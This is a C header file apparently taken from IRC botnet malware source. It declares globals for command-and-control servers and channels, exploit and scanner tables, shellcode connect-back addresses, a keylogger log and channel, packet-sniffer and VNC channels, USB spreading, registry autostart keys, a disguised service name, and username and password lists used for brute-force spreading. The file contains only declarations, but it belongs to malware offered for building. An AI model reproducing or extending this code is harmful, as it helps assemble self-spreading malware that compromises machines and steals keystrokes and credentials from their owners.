
DWORD			RandomDword();
// Return a random BYTE -- rewrite: bad hack used
BYTE			RandomByte();
int				RandomNumber(int iStart,int iEnd);
extern struct			Exploit_s pExploit[];
extern bool				bScanning;

extern DWORD			dwCurrentIp;
extern struct			ScannerHandler_s pScannerHandler;

// SHellcode functions
extern DWORD			dwSHellcodeIpAddress;
extern char				szSHellcodeIpAddress[16];
extern unsigned short	usSHellcodePort;
extern DWORD			dwShellcodeIpAddress;
extern char				szShellcodeIpAddress[16];

extern char filename2[256];
extern int RSD_PORT;

extern char svcname[128];
extern HANDLE ih;

extern char botid[];
extern char version[];
extern char password[];
extern char server[];
extern unsigned short port;
extern char serverpass[];
extern char channel[];
extern char chanpass[];
extern char server2[];
extern unsigned short port2;
extern char channel2[];
extern char chanpass2[];
extern char filename[];
extern char keylogfile[];
extern char valuename[];
extern char nickconst[]; 
extern char modeonconn[];
extern char chanmode[];
extern char exploitchan[];
extern char keylogchan[];
extern char psniffchan[];
extern char USB_STR_FILENAME[];
extern char vncchan[];
extern char techchan[];
extern char servicename[];
extern char servicedesc[];
extern char *authost[];
extern char *versionlist[];
extern char regkey1[];
extern char regkey2[];
extern char regkey3[];
extern char regkey4[];
extern EXPLOIT exploit[];
extern unsigned short socks4port;
extern unsigned short tftpport;
extern unsigned short httpport;
extern unsigned short ftpport;
extern unsigned short rloginport;

extern BOOL topiccmd;
extern BOOL rndfilename;
extern BOOL AutoStart;

extern char prefix;

extern int maxrand;
extern int nicktype;
extern BOOL nickprefix;

// global threads
extern THREAD threads[MAXTHREADS];

// url visit function
extern HANDLE ih;

// aliases
extern ALIAS aliases[MAXALIASES];
extern int anum;

// passwords
extern char *usernames[];
extern char *passwords[];

// advscan
extern EXPLOIT exploit[];

// array sizes
extern int authsize;
extern int versionsize;

// misc
extern DWORD started;
extern BOOL success;
extern int current_version;


#ifdef DEBUG_LOGGING
extern char logfile[];
#endif

#ifdef PLAIN_CRYPT
extern char key[];
#endif
